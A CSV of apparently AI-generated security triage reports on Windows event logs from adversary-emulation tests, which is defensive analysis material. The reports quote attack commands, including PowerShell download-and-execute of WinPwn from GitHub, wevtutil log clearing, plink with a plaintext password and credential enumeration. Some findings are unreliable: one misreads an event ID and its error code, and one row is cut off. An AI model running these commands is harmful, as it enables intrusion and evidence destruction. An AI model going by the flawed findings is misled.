Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"After a thorough analysis of the provided logs, there are several indicators suggesting suspicious and potentially malicious activities, which need further investigation. Below is a detailed assessment:

1. **PowerShell Activity:**
   - The logs indicate that PowerShell was executed with the command `get-addefaultdomainpasswordpolicy`. This could be a legitimate administrative activity, but it could also be indicative of reconnaissance activity by an attacker seeking to understand domain password policies.
   
2. **Event Log Clearing:**
   - The System and Security logs show that the event logs were cleared by the user `admin_test`, which is often an attempt to cover tracks after performing unauthorized or malicious activities. Clearing logs is a significant red flag when it comes to detecting potential security breaches.

3. **Use of `wevtutil`:**
   - The Sysmon logs highlight several instances of `wevtutil.exe`, a legitimate Windows utility, being used to clear various logs such as Application, System, and Windows PowerShell. The command lines referencing `wevtutil.exe cl` specifically indicate the clearing of logs.
   - The logs being cleared shortly after PowerShell execution further emphasizes an attempt to obscure activities.

4. **Time Manipulation:**
   - There are events related to time changes (`EventID 4616` from the Security log), indicating that the system time was modified by `svchost.exe`. This modification of time can be another suspicious activity that attackers perform to disrupt log timestamps or evade detection mechanisms.

5. **Processes Running with High Integrity Level:**
   - Many processes, including `whoami.exe`, `hostname.exe`, and `conhost.exe`, are logged as running with high integrity. While this alone is not suspicious, combined with the event log clearing, it suggests that potentially elevated privileges are being misused.

**Assessment:**
The combination of PowerShell usage, event log clearing, and time manipulation points to suspicious activity leaning towards malicious intent. The user `admin_test` seems to be involved in potentially unauthorized actions.

**Resolution:**
- **MALICIOUS**: The presence of log clearing activities along with suspicious PowerShell commands, especially in coordination, suggests that there is likely malicious activity occurring on the host.

**Guidance:**
- Initiate a comprehensive security incident response process.
- Conduct a thorough forensic investigation to determine the full extent of the compromise.
- Check for unauthorized access to critical systems and data.
- Review and secure the credentials for `admin_test` and any other potentially compromised accounts.
- Consider isolating the affected system and reviewing network-wide activity for similar indicators of compromise."
WinPwn - generaldomaininfo,"Upon examining the log entries provided, there are several indicators of potentially malicious activity that warrant further investigation. Below is an in-depth analysis:

### Key Indicators of Potential Malicious Activity:

1. **Log Clearing Events**:
   - Multiple log clearing events (`wevtutil.exe cl`) are noted in the security logs for System, Security, and Windows PowerShell logs:
     - Event ID `1102`: Security log being cleared by `admin_test`.
     - Sysmon logs show `wevtutil.exe` was run by `admin_test` to clear the Sysmon log.
   - Clearing event logs is generally considered a sign of malicious activity as attackers often clear logs to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - There are several PowerShell execution events where a script from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`) is downloaded and executed.
   - This behavior is suspicious because downloading and executing scripts from external repositories without validation can be an indicator of a PowerShell-based attack or reconnaissance activity.

3. **Time Changes**:
   - Event ID `4616` indicates changes in system time around the same period, which can be a common attacker tactic to manipulate log timestamps.

4. **Execution of Built-in Windows Tools**:
   - The use of `wevtutil.exe`, `whoami.exe`, and other built-in Windows utilities, all executed by the user `admin_test`, suggests potential reconnaissance or post-exploitation activity.

5. **High Integrity Level Execution**:
   - The integrity level of processes such as those using `wevtutil.exe` indicates high privilege execution, which is noteworthy when related to potential malicious activities.

6. **Network and External Connectivity**:
   - The PowerShell commands attempt to download and execute scripts hosted on an external platform which if unauthorized, is typically malicious or indicative of cyber espionage.

### Conclusion
Based on the analysis of the events, the logs contain multiple suspicious indicators:
- **Clearing event logs** suggests malicious intent to hide activities.
- **Downloading and executing scripts from GitHub** without internal validation or approval is concerning.
- These factors together provide a reasonable basis to suspect malicious intent or nefarious activities.

### Recommended Action
Due to these indicators and the potential risk associated with unauthorized log clearing and external script execution, the resolution for these logs should be:

- **MALICIOUS** 

The logs indicate potential malicious activity with high confidence. It is recommended to:
- **Conduct a full incident response** to identify and remediate any unauthorized access.
- **Perform a thorough examination of affected systems** and accounts.
- **Review user permissions** and apply the principle of least privilege.
- **Monitor and log all network activity** for further indicators of compromise.
- **Strengthen PowerShell logging and monitoring** to detect unusual script execution."
ESXi - VM Discovery using ESXCLI,"Upon analyzing the provided Windows event logs, several particular entries stand out as suspicious and potentially indicative of malicious activity:

1. **Event Log Clearing**:
   - System Log EventIDs 104 and Security Log EventID 1102 indicate that logs for the System, Windows PowerShell, and Security channels were cleared. The clearing of logs is often a technique used by malicious actors to cover their tracks.

2. **Unusual Process Execution**:
   - Sysmon logs show the execution of multiple commands, particularly `wevtutil.exe` to clear event logs, which aligns with the log-clearing events mentioned.
   - `whoami.exe`, `hostname.exe`, and suspicious use of `cmd.exe` with `plink.exe` and plaintext credentials (`-pw ""pass""`) are also noted, which is an unusual behavior that doesn’t align with regular administrative tasks.

3. **Indicators of Potential Compromise**:
   - The use of `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\plink.exe` implies a potential testing or exploitation framework, as Atomic Red Team is a known framework used for emulation of adversary techniques.
   - The execution of `plink.exe` suggests potential extraneous access or lateral movement attempts using SSH, which, coupled with plaintext credentials, could indicate a security issue.
   
4. **Privilege Escalation & Execution of High-Privilege Tasks**:
   - Security Log EventID 4672 indicates many high-privilege assignments, which could be suspicious if not conducted by authorized personnel.
   - Multiple systems and services are initiated or modified, suggesting potential abuse of administrative privileges.

Based on the analysis, the evidence, particularly the clearing of logs, usage of possible penetration testing tools, and credential exposure, strongly suggests potential malicious activity. 

**Resolution**: **MALICIOUS**

### Guidance:
- Immediately isolate the host from the network to prevent further unauthorized access.
- Conduct a detailed forensic analysis to determine the extent of compromise.
- Reset all credentials that might have been exposed, particularly focusing on administrative accounts.

- Consider conducting a wider scanning of other systems in the network to determine if the attack has proliferated."
WinPwn - printercheck,"Upon analyzing the provided Windows event logs, I have identified several indicators of potentially malicious activity that warrant further investigation. Here's a breakdown of the findings:

### Indicators of Suspicious Activities:

1. **Clearing of Event Logs**:
   - **Security Log Clearing**: EventID 1102 from the Security log indicates that the security log was cleared by the user `admin_test`. The clearing of event logs can often be a sign of malicious activity as it may be an attempt to cover tracks.
   - **System Log Clearing**: EventID 104 in the System log indicates clearing of the System event log by the same user.

2. **Suspicious PowerShell Activity**:
   - There is an event capturing the execution of a PowerShell script (`powershell.exe`) which downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This indicates potentially unauthorized or malicious scripting activity. The usage of `webclient` to download scripts from the internet is a common technique used in exploitation.

3. **Use of `wevtutil.exe`**:
   - The command-line utility `wevtutil.exe` is used multiple times to clear logs, as evidenced in the command lines such as `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`, etc. This behavior aligns with efforts to remove traces of activity from the system.

### Threats and Risks Identified:

- The clearing of logs by `admin_test` suggests a deliberate attempt to erase traces of potentially illicit or suspicious actions.
- The execution of a potentially harmful PowerShell script signifies a high risk of the system being exploited or data being compromised.

These findings present activities that strongly indicate possible malicious behavior. The combination of log clearance and external script execution suggests an attempt to mask malicious actions on the server.

### Guidance on How to Proceed:

- **Immediate Response**: Isolate the affected system (Server002) to prevent any potential lateral movement or further communication with possibly malicious hosts.
- **Further Investigation**: Conduct a deeper forensic analysis to confirm whether unauthorized changes were made to the system and identify any data exfiltration attempts.

Based on the evidence and the nature of activities captured in the logs, the final resolution is:

### MALICIOUS

Actions should be taken swiftly to assess the extent of the compromise and to secure the environment from further threats."
Security Software Discovery - AV Discovery via WMI,"Upon analysis of the provided event logs, the following points outline the suspicious and potentially malicious findings:

### Suspicious Findings:
1. **Clearing Event Logs:**
   - Several logs have been cleared as indicated by the use of the `wevtutil.exe` command to clear logs. Specifically:
     - `Security` log cleared by user `admin_test` using `wevtutil.exe` (ProcessId: 3328).
     - `System` log cleared by user `admin_test`.
     - `Windows PowerShell` log cleared by user `admin_test`.
     - These actions are typically performed to cover tracks and are highly suspicious.

2. **High Integrity Level Execution:**
   - Multiple processes were executed at a high integrity level, including `wevtutil.exe`, `conhost.exe`, and other utility executables like `hostname.exe` and `whoami.exe`. Executing with high integrity often indicates elevated privileges, which can be a hallmark of malicious activity especially if unauthorized.

3. **Unexpected Process Execution:**
   - The execution of `cmd.exe` with command-line arguments involving `wmic.exe` to query antivirus information (`wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName`). This might indicate reconnaissance activities to understand the security posture of the system.

4. **Adjustment to System Time:**
   - There was an adjustment of system time (`EventID 24` and `EventID 1` from Kernel-General and `EventID 35` from Time-Service). While small adjustments might not be suspicious, they can be used as a tactic to meddle with timestamps to confuse log timelines.

### Assessment:
- The clearing of event logs by the `admin_test` user is a critical indicator. This behavior often indicates an attempt to obfuscate activities on the machine, which is a typical practice by attackers to erase evidence.
- The pattern of executing utilities to gather system and security information in combination with log clearing suggests preparation for further malicious activity or an ongoing unauthorized operation.
- The combination of high integrity level executions and system time adjustments could indicate attempts to perform actions beyond standard user activities in a way that's hard to trace.

### Resolution:
- **MALICIOUS:** The logs presented contain clear indicators of potentially malicious activity, particularly with the deliberate clearing of logs, usage of system utilities for information gathering, and actions conducted under elevated privileges. It is highly recommended to conduct a comprehensive investigation to identify any additional compromise, secure the system, and prevent further unauthorized access.

### Guidance on Proceeding:
1. **Immediate Steps:**
   - Isolate the affected system from the network to prevent further unauthorized access or data exfiltration.
   - Preserve all forensic evidence. Ensure that no additional logs or files are deleted or modified.

   - Execute a thorough check for any signs of malware or unauthorized modifications on the system and assess whether any other connected systems have been affected.

3. **Remediation and Recovery:**
   - Restore affected system logs to maintain audit integrity and consider increasing the security monitoring level.
   - Apply security patches and strengthen security policies, including ensuring least privilege access, to mitigate future risks.

4. **Review Security Posture:**
   - Conduct a full security audit of network and IT infrastructure to prevent similar incidents in the future.
   - Enhance detection capabilities by implementing advanced monitoring solutions to detect similar behaviors in real-time."
File and Directory Discovery (cmd.exe),"Based on an analysis of the event logs provided, here are the findings:

1. **Log Clearing:** There are multiple instances of log files being cleared. The `wevtutil.exe` command was used to clear event logs (`System`, `Application`, and `Windows PowerShell`) for the user `admin_test`. For example:
   - System log: `{""Image"":""C:\\Windows\\System32\\wevtutil.exe"" ""cl System""`
   - Application log: `{""Image"":""C:\\Windows\\System32\\wevtutil.exe"" ""cl Application""`
   - Windows PowerShell log: `{""Image"":""C:\\Windows\\System32\\wevtutil.exe"" ""cl \""Windows PowerShell\""""}`

   Log clearing is a common tactic used by attackers to cover their tracks, indicating potential malicious intent.

2. **Suspicious Command Line Execution:** There are `cmd.exe` executions with commands designed to gather file directory listings and output them to a text file (potential data exfiltration preparation):
   - Command executed: `cmd.exe /c dir /s c:\\ ... > %temp%\\T1083Test1.txt`
   
   The use of such command lines can be a sign of reconnaissance or data gathering activity on the system.

3. **Change in System Time:** There is a discrepancy between the `OldTime` and `NewTime` observed in security and system logs. Specifically, logs indicate a time change event by `svchost.exe`. Time discrepancies can imply attempts to manipulate timestamps for log evasion purposes.

4. **Multiple Privilege Use Events:** There are events indicating the exercise of privileged operations (`SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`) by the `SYSTEM` account. While these can be standard system operations, during or around other suspicious activities, they can indicate potential system manipulation.

5. **Multiple Credential Events:** There are multiple failed credential access attempts (`EventID: 5379`). While failed credential attempts can occur in non-malicious scenarios, they can be an indication of unauthorized access attempts.

**Assessment:**
Based on the log evidence:
- The clearing of multiple event logs using the `wevtutil.exe` tool is indicative of an attempt to erase traces possibly related to suspicious activities.
- The use of `cmd.exe` with a sequence of directory listing commands implies reconnaissance or data staging, which is suspicious behavior, especially in conjunction with the cleared logs.
- The time manipulation and excessive privilege use add context to potential malicious actions attempting to circumvent security and detection mechanisms.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately investigate `admin_test` user activity and their sessions leading up to the log clearance.
- Review and bolster system logging and monitoring to prevent log clearance and ensure tamper-evidence.
- Conduct a thorough investigation to ensure no data has been exfiltrated.
- Isolate and conduct further forensic analysis on the host to determine the full extent of the compromise.
- Initiate incident response procedures to address and contain the potential security breach.
- Assess and apply security patches, increase security controls, and review user privileges."
System Time Discovery W32tm as a Delay,"After a detailed review and analysis of the provided Windows event logs, the following points highlight significant suspicious activities:

1. **Event Log Clearing**: The clearing of event logs is a significant indicator of potential malicious activity. Specifically:
   - **Security Log Cleared** (`EventID 1102`) by the user `admin_test` on `Server002` at `2024-10-25 10:42:18`.
   - **System Log Cleared** (`EventID 104`) by the same user and at a closely following timestamp.
   - **Windows PowerShell Log Cleared** also noted in the System logs, indicating multiple logs were cleared in the same event sequence.

   Clearing of logs typically indicates an attempt to cover tracks or a prelude to malicious activities.

2. **Process Execution Pattern**: The execution of `wevtutil.exe`, a Windows utility used for managing event logs, with the command `wevtutil.exe cl <log_name>` (e.g., `Security`, `Application`, etc.) is observed multiple times. This suite of commands likely aligns with the activity of clearing event logs.

3. **High Integrity Levels**: The processes associated with the log clearing (`wevtutil.exe`) were executed with high integrity levels by the user `admin_test`, indicating administrative permissions were likely abused to clear these logs.

4. **Time Manipulation**: There is an observed sequence where the system time was adjusted by using `svchost.exe`, with `EventID 4616`, indicating possible tampering with system time, which can be used to obscure timestamps of events.

5. **Microsoft Edge Activity**: While there are numerous events related to `MicrosoftEdgeUpdate.exe`, these are less concerning compared to the log clearing. They may represent standard update activities. However, still worth verifying if it coincided with unauthorized access.

**Conclusion**:
Given the serious nature of event log clearing and potential time tampering indicative of malicious intent, the set of activities captured in the logs should be classified as:
- **MALICIOUS**: The logs consist of events clearly indicative of malicious actions, e.g., attempts to cover tracks by deleting event logs.

**Recommended Actions**:
1. **Immediate Incident Response**: Initiate IR protocols to investigate the source of these actions, especially focusing on the credentials and activities of the user `admin_test`.
2. **Forensic Investigation**: Preserve existing logs and other evidences before they are potentially manipulated further. Use forensic tools to analyze disk and memory to look for additional indicators of compromise.
3. **Review Access Controls**: Carry out an audit of user accounts and privilege levels, focusing on the `admin_test` account for any unauthorized privileges and review authentication logs.
4. **Enhance Monitoring**: Implement more rigorous event logging policies, including regular reviews and automated alerts for log clearing events.
"
Adfind - Query Active Directory Groups,"After a thorough examination of the log entries, the following points indicate a potentially malicious activity or compromise:

1. **Event Log Clearance**: There are multiple instances of event log clearance (`EventID: 1102` for Security log and `EventID: 104` for System and PowerShell logs) by the user `admin_test`. This is often indicative of someone trying to cover their tracks on a system. Event logs are cleared to hide malicious activities.

2. **Execution of Suspicious Commands**: The use of `wevtutil.exe` with the `cl` (Clear log) command multiple times for different logs (Security, Application, System, and Windows PowerShell) is observed. This further supports the idea of log tampering to hide tracks.

3. **Potential Unauthorized Access and Elevated Rights**: There is an `EventID: 4672` indicating special privileges assigned to `SYSTEM` and a logon event (`EventID: 4624`) suggesting a privileged account activity. The presence of critical privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` is notable, potentially indicating attempt for privilege escalation.

4. **Anomalous Processes**: The execution and chain of processes, including `powershell.exe` and `cmd.exe`, also linked to `whoami.exe` and `AdFind.exe` in a temporary directory, suggests reconnaissance activities commonly associated with lateral movement or information gathering within the network.

5. **Use of Potentially Malicious Tools (`AdFind.exe`)**: The execution of `AdFind.exe` from a non-standard directory implies the use of external tools for directory enumeration, a behavior often seen in penetration tests or malicious activity.

Although Windows Defender was active (`SECURITY_PRODUCT_STATE_ON`), it does not give a clean bill of health given the surrounding suspicious activity.

Based on these findings, the logs contain clear signs of log tampering, unauthorized privilege escalation, potential use of external reconnaissance tools, and possible post-exploitation activities.

- **Implement Incident Response Plan**: Follow through with a predefined incident response plan to address, remediate, and recover from this event.
- **Educate and Train Staff**: Initiate security awareness training to prevent similar future incidents."
Hostname Discovery (Windows),"### Detailed Analysis

Upon analyzing the provided Windows event logs from the machine named `Server002`, several entries stand out due to potential indicators of malicious activity or compromise:

1. **Clearing of Event Logs**:
   - **System Log & PowerShell Log Clearing**: The logs exhibit entries where the event logs (System, Security, and Windows PowerShell) were cleared by a user named `admin_test`. The clearing of event logs (Event ID 104 for system logs and Event ID 1102 for security logs) is often a tactic used by attackers to cover their tracks and hinder forensic investigation.
   - **Recurrent Use of `wevtutil` Utility**: The `wevtutil` command-line utility was executed multiple times with the `cl` (clear) option to clear various logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`, and `Windows PowerShell`). This action is consistent with attempts to tamper with the log data.

2. **Timestamp Anomalies**:
   - **Time Changes**: There are security events indicating changes in the system time (Event ID 4616). While these logs alone are not inherently malicious, combined with other suspicious activities, they may indicate an attempt to manipulate timestamps to confuse log analysis or forensic reconstruction.

3. **Unusual Executions**:
   - **High Privilege Logons**: The account `admin_test` has multiple logon events with administrative privileges. The user has been granted high-level privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.), which could be misused in a malicious context if the account credentials were compromised.
   - **Execution of Reconnaissance Commands**: There are entries showing the execution of `whoami.exe`, `hostname.exe`, and other command-line utilities. While legitimate users might use these for various reasons, when combined with log clearing, they could indicate reconnaissance activities.

4. **Network Connections**:
   - **Remote Logon**: The logs also show remote logon events (Event ID 4624, Logon Type: 3), which could indicate remote access. The IP addresses used are link-local addresses (`fe80::`), typically not routable, but still worth noting in the context of potential lateral movement within a network.

### Assessment

Based on the detailed analysis, the logs contain several suspicious behaviors: the clearing of multiple event logs, the use of high privilege commands, and changes to system time. These activities suggest an active attempt to manipulate system states and obscure events, which are hallmark tactics of malicious actors.

### Resolution

**SUSPICIOUS** - The logs contain activities that are highly suspicious and warrant further in-depth investigation.

### Guidance

1. **Containment**:
   - Ensure the integrity of your centralized logging system. Collect and back up logs from all related systems without delay. Consider isolating `Server002` from the network to prevent further suspicious activities.
  
2. **Investigation**:
   - Conduct a detailed forensic analysis on `Server002`. This should include checking the integrity of the systems, reviewing all administrative actions, and validating the current security configurations.
   - Investigate the admin account `admin_test`, reviewing authentication logs and confirming the legitimacy of its activities.

3. **Mitigation**:
   - Reset credentials associated with `admin_test` and other potentially compromised accounts.
   - Implement enhanced monitoring and logging mechanisms to prevent unauthorized log cleaning. Consider using logs shipped in real-time to a secure SIEM system.
   - Conduct a threat hunting exercise to look for further indicators of compromise across the network."
Reg query for AlwaysInstallElevated status,"Upon analyzing the provided logs, several indicators suggest potential malicious activity within the system. Here is an assessment of the logs based on the presence of suspicious behaviors and events:

### Suspicious or Anomalous Behavior:

1. **Log Clearing Activity**:
   - **Event ID 104 and 1102**: The system log and security log were cleared using the `wevtutil.exe` utility by the user `admin_test`. Log clearing is often conducted by attackers to erase traces of their activities, though in some cases, a legitimate admin might also perform this action. However, when combined with other suspicious activities, it becomes highly indicative of malicious behavior.

2. **Process Execution and Commands**:
   - **`wevtutil.exe` Executions**: There are multiple executions of `wevtutil.exe` clearing logs from various channels (System, Security, Application, Windows PowerShell). This repeated execution for log clearance further substantiates malicious intent.
   - **Registry Query via `cmd.exe`**: A command was executed to check the values of `AlwaysInstallElevated` in the Windows Registry. This setting can be exploited by attackers to escalate privileges by allowing the installation of software with elevated privileges for any user. Checking this setting is a red flag for potential privilege escalation attempts.

3. **SQL Authentication Logs and Return Codes**:
   - **Event ID 5379**: Multiple credential-related events with the return code `3221226021`, which translates to STATUS_LOGON_FAILURE. This suggests repeated failed authentication attempts related to a Microsoft account, possibly indicating password guessing or brute force attempts.

### Indicators of Malicious Activity or Compromise:

- **Privilege Escalation Attempts**: The query to check `AlwaysInstallElevated` values indicates an attempt to identify weakness in security settings that could be leveraged for privilege escalation, a common technique in lateral movement within compromised systems.

- **Log Clearance**: A significant indicator of malicious activity as it attempts to hide unauthorized activities from being easily traced.

### Conclusion:

Based on the analysis, the combination of commands related to log clearance using `wevtutil.exe` and the check of registry keys linked to elevating privileges suggest purposeful actions to cover tracks and exploit the system. These are strong indicators of malicious activity, although confirmation would ideally be assisted by further context such as access logs, network traffic, or host-based intrusion detection alerts.

The assessment of the situation is:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent further spread of potential threats.
   - Conduct a thorough forensic analysis to identify the extent of the compromise and any additional indicators of compromise (IOCs).
   - Review network traffic and other hosts for similar activities indicative of lateral movement within the network.

2. **Remediation**:
   - Reset credentials for accounts suspected to have been compromised.
   - Audit and possibly reconfigure security settings related to registry values and ensure that elevated installation is only allowed for authorized users.

3. **Regular Monitoring and Improvement**:
   - Implement and review security monitoring and alerting systems to catch similar activities in the future.
   - Educate and train users about security best practices to minimize the likelihood of social engineering attacks leading to such compromises.

The activities observed indicate a serious breach that requires immediate action to determine the extent of the compromise and to secure the network environment effectively."
Enumerate all accounts on Windows (Local),"### Analysis

**1. Anomalies in Logs:**

- **Log Deletion Events:**  
  - There are multiple events associated with logs being cleared. Specifically, entries from the Security, System, and Windows PowerShell logs are cleared by a user `admin_test` (Security Log ID 1102, System Log ID 104). Log clearing is often an indicator of malicious activity or attempts to obfuscate actions.

- **Process Execution and Command-line Usage:**
  - A series of command-line events show the execution of querying user details and groups using commands like `net user`, `cmdkey.exe /list`, `dir c:\Users\`, and invoking `net localgroup`. This combination is atypical for routine administrative tasks and might be an attempt to enumerate system credentials or groups for further exploitation.
  
  - Invocation of `wevtutil.exe` to manipulate event logs (`cl` argument used) stands out as suspicious if there is no legitimate reason such as troubleshooting or log management.

- **Time Discrepancy Adjustment:**
  - Multiple time change events (`EventID: 4616` under the Security log) indicate the system time was adjusted. Changing system time can interfere with log timestamps and may be associated with attempts to cover tracks.

**2. Potentially Malicious Indicators:**

- **Credential Enumeration and Potential Privilege Escalation:**  
  - Execution of `cmd.exe` with an elaborate chain of commands to gather user information, password caches, and group memberships suggests reconnaissance for privilege escalation.

- **Suspicious User Activity:**  
  - User `admin_test` was involved in several critical actions like clearing logs and executing suspicious command lines under a high integrity level.

- **Misuse of System Processes:**
  - The use of built-in utilities like `wevtutil.exe`, `net.exe`, and `cmdkey.exe` for potentially unauthorized purposes is concerning.

**3. Abnormal Software and Process Activities:**

Adfind - Enumerate Active Directory Computer Objects,"Upon reviewing the provided logs from the Windows host, I have identified several activities that raise concerns regarding potential malicious behavior:

1. **Event Log Clearing (Security Log):** 
   - **Event ID 1102** on 2024-10-21 09:45:27 indicates that the security event log was cleared by the user `admin_test`. Clearing event logs is often an indication of an attempt to cover up tracks after unauthorized actions or malicious activities.

2. **Suspicious Process Execution (Sysmon Log):** 
   - A sequence of `wevtutil.exe` executions to clear logs across multiple channels, including Security, System, and Windows PowerShell, at 09:45:27. This correlates with the logs being suspiciously cleared, which might be related to an attempt to delete evidence of activity.
   
3. **Unusual Usage of Command Line:**
   - The presence of a `cmd.exe` process running `AdFind.exe`, a known enumeration tool often used by attackers for gathering information about computers, at 09:45:27. The use of enumeration tools is commonly associated with penetration testing or malicious reconnaissance activities.

4. **Multiple Instances of `conhost.exe`:**
   - Frequent launching of `conhost.exe` processes which often accompany command-line or script-based operations. While this could be standard, in association with log deletions and enumeration tools, it is suspicious.

5. **Process Activity and Privilege Use (Event ID 4672):**
   - At 09:45:26, privileges including `SeDebugPrivilege` and other high-level system privileges were assigned to the SYSTEM account. While SYSTEM typically holds such privileges, this should be double-checked in context with other activities.

These activities suggest attempts to hide actions (via log clearing) and potential reconnaissance (via use of `AdFind.exe`). The pattern is consistent with pre-attack stages, often part of the attack lifecycle in penetration testing or real-world attacks. Given the combination of these events, it's indicating suspicious activity that needs further investigation.

**Resolution:** 
- **SUSPICIOUS** - The activities observed in the logs, specifically log clearing and the use of enumeration tools, require further investigation. The security team should undertake a detailed forensic analysis to verify if these activities align with authorized administrative tasks or if they are indicative of a potential security breach. Consider checking for any unauthorized access or recent changes to system configurations that could provide more context."
Enumerate All Network Shares with Snaffler,"**Analysis of the Logs:**

After analyzing the provided logs from the Windows host, several points stand out that need to be addressed:

1. **Potential Malicious PowerShell Usage**:
   - The logs show multiple instances where PowerShell is used to execute the `Snaffler.exe` application from a potentially suspicious directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\`.
   - The usage of `invoke-expression` and launching a PowerShell command with encoded commands indicates attempts to obfuscate or hide the true nature of the task being executed. The encoded command decodes to a similar invocation of `Snaffler.exe`.
   - Tools like `Snaffler.exe` can be used for network reconnaissance, which may be part of a post-exploitation activity. The presence of this tool could indicate that someone is trying to enumerate and observe network shares and permissions.

2. **Sysmon Logging Anomalies**:
   - There are multiple Sysmon entries associated with processes like `cmd.exe`, `wevtutil.exe`, `conhost.exe`, and `powershell.exe`, showing signs of orchestration that appear automated and potentially part of a script aimed at clearing logs.
   - Event logs being cleared (Security log EventID 1102) and the use of `wevtutil.exe` to clear logs are strong indications of an attempt to cover tracks.

3. **Security Event Log Deletion**:
   - The logs show entries where `admin_test` has performed operations associated with high privilege (e.g., EventID 4672).
   - There's a specific Security log entry (EventID 1102) that indicates ""The event log was cleared,"" which is often seen in malicious activities to hide evidence of an attack.

4. **Undesired Privileged Access and Clearing Logs**:
   - The specific activities involving high privilege access and attempts to clear logs align with common attack methodologies of maintaining persistence and covering tracks.

These indicators point towards an orchestrated activity that closely aligns with known malicious behavior patterns. The repetitive nature of log clearing and the execution of potential reconnaissance tools like `Snaffler.exe` denote activities typical in the initial phases of a security breach or a penetration test ignored by blue team protections.

**Assessment and Resolution:**

Based on the aggregated analysis of the PowerShell logs, Security logs, Sysmon logs, and their respective timelines, these findings are consistent with suspicious activity that requires further investigation. The presence of activities indicative of reconnaissance and log clearing efforts fit into a frameworks pattern of exploitation phases.

**Resolution: SUSPICIOUS**

The event logs contain activities that do not inherently indicate a system compromise but suggest unauthorized or unwarranted actions that are highly suspicious. Immediate steps should include:
- Conducting a full investigation by identifying the individual(s) responsible for these activities.
- Reviewing system and network defenses to ensure no further malicious actions can be taken.
- Performing a forensic analysis on affected systems to determine the source and scope of potential reconnaissance or malicious activities."
Enumerate Active Directory Computers with ADSISearcher,"### Analysis:

1. **Windows PowerShell Logs:**
   - The logs show a PowerShell script executing: `powershell.exe & {([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()}`. This script is performing a query using ADSI (Active Directory Service Interfaces) to search for computer objects. This could be a legitimate admin task, but it's noteworthy due to potential misuse for reconnaissance by malicious actors.

2. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe` are clearing event logs (System, Application, etc.). This is typically suspicious behavior, as attackers often clear logs to cover their tracks.
   - The execution of `wevtutil.exe` is performed by the user `SERVER002\admin_test` with high integrity level, suggesting the user has administrative privileges.
   - A `conhost.exe` associated with `wevtutil.exe`, which is normal for command line utilities, but the frequency and context aligned with log clearing is suspicious.

3. **Security Logs:**
   - A security event (1102) indicates the security log was cleared by `admin_test`, coinciding with the `wevtutil.exe` executions. Log clearing in the Security log, especially, is a red flag as it suggests an attempt to hide malicious activities.

4. **System and Application Logs:**
   - Log entries confirm the clearing of logs such as System and Windows PowerShell at the same timestamp when `wevtutil.exe` was executed.
   - Legitimate updates and system activities, such as Microsoft Defender updates and various system processes like Windows Update, `svchost.exe`, and `wuauclt.exe`, showing regular maintenance activities.
   - Windows Defender is reported as active and functioning correctly (SecurityCenter event 15).

### Assessment:

The logs display a pattern of behavior that is typically indicative of malicious activity:

- **Log Clearing:** The consistent clearing of various Windows event logs by a user with administrative privileges is highly suspicious. This is commonly done by attackers to erase evidence of their presence or actions on a system.
- **PowerShell Execution:** While the PowerShell command could be legitimate, its use in the context of other suspicious activities (such as log clearing) might indicate misuse by an unauthorized party.

### Conclusion:

**Resolution: MALICIOUS**

The actions in the logs, particularly the event log clearing using `wevtutil.exe`, combined with the administrative level PowerShell script running, strongly indicate malicious activity. Immediate investigation and remediation are recommended:

### Guidance on How to Proceed:

- **Immediate Containment:** Disconnect the system from the network to prevent further unauthorized access.
- **Comprehensive Forensic Analysis:** Conduct a deeper analysis of the system to identify any additional malicious activity, potential persistent threats, or access points that could have been established.

- **Strengthen Security Measures:** Update security protocols and consider implementing tighter monitoring and logging policies to prevent similar incidents in the future.
- **Restore Logs and System:** Attempt to restore cleared logs from backup if possible to understand the timeline of events before log clearing occurred."
WinPwn - GeneralRecon,"Based on the provided Windows event logs, here is a detailed analysis:

### Indicators of Suspicious or Malicious Activity

1. **Event Log Clearing**:
   - Logs indicate the use of `wevtutil.exe` to clear various system logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Security`, `Windows PowerShell`), performed by the `admin_test` user. This is highly suspicious, as attackers often clear logs to cover their tracks after executing malicious activities.

2. **PowerShell Usage**:
   - The logs reveal the execution of a PowerShell command that downloads and executes a script from a remote location: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. Downloading and executing scripts from the internet can be indicative of malicious intent, especially if the downloaded script has not been verified as safe and legitimate.

3. **Process Execution**:
   - The execution of `powershell.exe` with the URL `https://raw.githubusercontent.com/.../WinPwn.ps1` suggests potential use of PowerShell for executing a downloaded script, often noted in malicious activities.
   
4. **Integrity and Logon Information**:
   - The commands and actions were executed with high integrity and under the `admin_test` account. This indicates that a user with administrative access could have been compromised.

5. **Command Line Obfuscation or Uncommon Usage**:
   - The Event ID 1 processes (`wevtutil.exe` with ""cl"" command-line argument to clear logs) are indeed common Windows processes but are being used in a context that seems intended to hide or obscure activity logs.

### Assessment of the Situation

- **Indicators of Malicious Activity**: The activities captured in the logs, especially the use of `wevtutil.exe` to clear logs and the execution of potentially suspicious PowerShell commands downloading from untrusted sources, strongly suggest malicious activity.
- **Intent to Obfuscate**: Clearing logs is a known technique to obfuscate potentially malicious actions. The combination of unauthorized script execution and log clearing amplifies the risk of compromise.
- **Context and Timing**: The coordinated timing of these actions in quick succession could suggest a script or automated task designed to execute and cover its tracks rapidly.

### Resolution

